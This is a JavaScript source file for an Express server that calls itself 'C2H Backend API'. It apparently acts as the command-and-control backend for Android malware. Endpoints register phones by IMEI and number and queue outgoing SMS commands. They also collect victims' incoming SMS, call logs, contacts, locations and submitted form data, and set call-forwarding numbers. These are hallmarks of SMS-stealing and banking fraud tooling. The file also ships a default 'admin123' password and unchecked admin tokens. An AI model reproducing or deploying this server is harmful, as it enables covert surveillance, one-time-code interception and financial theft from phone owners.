const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const admin = require('firebase-admin');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Firebase Admin SDK initialization
try {
  const serviceAccount = {
    type: "service_account",
    project_id: process.env.FIREBASE_PROJECT_ID,
    private_key: process.env.FIREBASE_PRIVATE_KEY?.replace(/\\n/g, '\n'),
    client_email: process.env.FIREBASE_CLIENT_EMAIL,
  };

  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: process.env.FIREBASE_DATABASE_URL
  });

  console.log('✅ Firebase initialized successfully');
} catch (error) {
  console.log('⚠️  Firebase not configured. Using mock data mode.');
}

const db = admin.firestore();

// ============ DEVICE ENDPOINTS ============

// Register new device
app.post('/api/device/register', async (req, res) => {
  try {
    const { deviceId, deviceName, androidVersion, imei, phoneNumber } = req.body;
    
    const deviceData = {
      deviceId,
      deviceName,
      androidVersion,
      imei,
      phoneNumber,
      battery: 100,
      status: 'online',
      lastSeen: admin.firestore.FieldValue.serverTimestamp(),
      registeredAt: admin.firestore.FieldValue.serverTimestamp()
    };

    await db.collection('devices').doc(deviceId).set(deviceData);
    
    console.log('📱 Device registered:', deviceName);
    res.json({ success: true, message: 'Device registered successfully', data: deviceData });
  } catch (error) {
    console.error('Error registering device:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Update device status
app.post('/api/device/update', async (req, res) => {
  try {
    const { deviceId, battery, status, location } = req.body;
    
    const updateData = {
      battery,
      status,
      lastSeen: admin.firestore.FieldValue.serverTimestamp()
    };

    if (location) {
      updateData.location = location;
    }

    await db.collection('devices').doc(deviceId).update(updateData);
    
    res.json({ success: true, message: 'Device updated' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get all devices
app.get('/api/devices', async (req, res) => {
  try {
    const snapshot = await db.collection('devices').get();
    const devices = snapshot.docs.map(doc => ({ 
      id: doc.id, 
      ...doc.data(),
      lastSeen: doc.data().lastSeen?.toDate().toISOString()
    }));
    
    res.json({ success: true, data: devices });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get single device
app.get('/api/device/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const doc = await db.collection('devices').doc(deviceId).get();
    
    if (!doc.exists) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }
    
    res.json({ success: true, data: { id: doc.id, ...doc.data() } });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Delete device
app.delete('/api/device/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    await db.collection('devices').doc(deviceId).delete();
    
    res.json({ success: true, message: 'Device deleted' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============ SMS ENDPOINTS ============

// Send SMS command to device
app.post('/api/sms/send', async (req, res) => {
  try {
    const { deviceId, phoneNumber, message, simSlot } = req.body;
    
    const smsCommand = {
      deviceId,
      phoneNumber,
      message,
      simSlot: simSlot || 'SIM1',
      status: 'pending',
      createdAt: admin.firestore.FieldValue.serverTimestamp()
    };

    const docRef = await db.collection('sms_commands').add(smsCommand);
    
    console.log('📤 SMS command sent to device:', deviceId);
    res.json({ success: true, message: 'SMS command sent', commandId: docRef.id });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get pending SMS commands for device
app.get('/api/sms/commands/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    
    const snapshot = await db.collection('sms_commands')
      .where('deviceId', '==', deviceId)
      .where('status', '==', 'pending')
      .get();
    
    const commands = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
    
    res.json({ success: true, data: commands });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Update SMS command status
app.post('/api/sms/command/update', async (req, res) => {
  try {
    const { commandId, status } = req.body;
    
    await db.collection('sms_commands').doc(commandId).update({
      status,
      updatedAt: admin.firestore.FieldValue.serverTimestamp()
    });
    
    res.json({ success: true, message: 'Command status updated' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Log received SMS from device
app.post('/api/sms/log', async (req, res) => {
  try {
    const { deviceId, from, message, timestamp } = req.body;
    
    const smsLog = {
      deviceId,
      from,
      message,
      timestamp,
      receivedAt: admin.firestore.FieldValue.serverTimestamp()
    };

    await db.collection('sms_logs').add(smsLog);
    
    console.log('📨 SMS logged from device:', deviceId);
    res.json({ success: true, message: 'SMS logged' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get SMS logs for admin
app.get('/api/sms/logs/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const limit = parseInt(req.query.limit) || 50;
    
    const snapshot = await db.collection('sms_logs')
      .where('deviceId', '==', deviceId)
      .orderBy('timestamp', 'desc')
      .limit(limit)
      .get();
    
    const logs = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
    
    res.json({ success: true, data: logs });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============ CALL FORWARDING ENDPOINTS ============

// Update forwarding number
app.post('/api/forwarding/update', async (req, res) => {
  try {
    const { deviceId, forwardingNumber } = req.body;
    
    await db.collection('devices').doc(deviceId).update({
      forwardingNumber,
      updatedAt: admin.firestore.FieldValue.serverTimestamp()
    });
    
    console.log('📞 Forwarding number updated for device:', deviceId);
    res.json({ success: true, message: 'Forwarding number updated' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get call logs
app.get('/api/calls/logs/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const limit = parseInt(req.query.limit) || 50;
    
    const snapshot = await db.collection('call_logs')
      .where('deviceId', '==', deviceId)
      .orderBy('timestamp', 'desc')
      .limit(limit)
      .get();
    
    const logs = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
    
    res.json({ success: true, data: logs });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Log call from device
app.post('/api/calls/log', async (req, res) => {
  try {
    const { deviceId, number, type, duration, timestamp } = req.body;
    
    const callLog = {
      deviceId,
      number,
      type, // incoming, outgoing, missed
      duration,
      timestamp,
      receivedAt: admin.firestore.FieldValue.serverTimestamp()
    };

    await db.collection('call_logs').add(callLog);
    
    res.json({ success: true, message: 'Call logged' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============ FORMS/DATA ENDPOINTS ============

// Submit form data from device
app.post('/api/forms/submit', async (req, res) => {
  try {
    const { deviceId, formData, formType } = req.body;
    
    const submission = {
      deviceId,
      formData,
      formType,
      submittedAt: admin.firestore.FieldValue.serverTimestamp()
    };

    await db.collection('form_submissions').add(submission);
    
    console.log('📝 Form data received from device:', deviceId);
    res.json({ success: true, message: 'Form data received' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get forms for admin
app.get('/api/forms/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    
    const snapshot = await db.collection('form_submissions')
      .where('deviceId', '==', deviceId)
      .orderBy('submittedAt', 'desc')
      .get();
    
    const forms = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
    
    res.json({ success: true, data: forms });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============ CONTACTS ENDPOINTS ============

// Sync contacts from device
app.post('/api/contacts/sync', async (req, res) => {
  try {
    const { deviceId, contacts } = req.body;
    
    // Store contacts
    await db.collection('devices').doc(deviceId).update({
      contacts,
      contactsUpdatedAt: admin.firestore.FieldValue.serverTimestamp()
    });
    
    console.log(`📇 ${contacts.length} contacts synced from device:`, deviceId);
    res.json({ success: true, message: 'Contacts synced' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get contacts
app.get('/api/contacts/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const doc = await db.collection('devices').doc(deviceId).get();
    
    if (!doc.exists) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }
    
    const contacts = doc.data().contacts || [];
    res.json({ success: true, data: contacts });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============ ADMIN AUTH ============

app.post('/api/admin/login', async (req, res) => {
  try {
    const { password } = req.body;
    
    const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
    
    if (password === ADMIN_PASSWORD) {
      const token = 'admin-token-' + Date.now();
      res.json({ success: true, message: 'Login successful', token });
    } else {
      res.status(401).json({ success: false, message: 'Invalid password' });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Change admin password
app.post('/api/admin/change-password', async (req, res) => {
  try {
    const { oldPassword, newPassword } = req.body;
    
    const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
    
    if (oldPassword !== ADMIN_PASSWORD) {
      return res.status(401).json({ success: false, message: 'Invalid old password' });
    }
    
    // In production, update this in environment variables or database
    console.log('⚠️  Update ADMIN_PASSWORD in .env to:', newPassword);
    
    res.json({ success: true, message: 'Password changed. Update .env file.' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============ HEALTH CHECK ============

app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

app.get('/', (req, res) => {
  res.json({
    name: 'C2H Backend API',
    version: '1.0.0',
    status: 'running',
    endpoints: {
      devices: '/api/devices',
      sms: '/api/sms/*',
      calls: '/api/calls/*',
      forms: '/api/forms/*',
      contacts: '/api/contacts/*',
      admin: '/api/admin/*'
    }
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`\n🚀 C2H Backend API running on port ${PORT}`);
  console.log(`📡 API URL: http://localhost:${PORT}`);
  console.log(`\n📋 Available Endpoints:`);
  console.log(`   Device Management:`);
  console.log(`   - POST   /api/device/register`);
  console.log(`   - POST   /api/device/update`);
  console.log(`   - GET    /api/devices`);
  console.log(`   - GET    /api/device/:deviceId`);
  console.log(`   - DELETE /api/device/:deviceId`);
  console.log(`\n   SMS Management:`);
  console.log(`   - POST   /api/sms/send`);
  console.log(`   - GET    /api/sms/commands/:deviceId`);
  console.log(`   - POST   /api/sms/command/update`);
  console.log(`   - POST   /api/sms/log`);
  console.log(`   - GET    /api/sms/logs/:deviceId`);
  console.log(`\n   Call Management:`);
  console.log(`   - POST   /api/forwarding/update`);
  console.log(`   - POST   /api/calls/log`);
  console.log(`   - GET    /api/calls/logs/:deviceId`);
  console.log(`\n   Forms & Data:`);
  console.log(`   - POST   /api/forms/submit`);
  console.log(`   - GET    /api/forms/:deviceId`);
  console.log(`\n   Contacts:`);
  console.log(`   - POST   /api/contacts/sync`);
  console.log(`   - GET    /api/contacts/:deviceId`);
  console.log(`\n   Admin:`);
  console.log(`   - POST   /api/admin/login`);
  console.log(`   - POST   /api/admin/change-password`);
  console.log(`\n✅ Server ready!\n`);
});
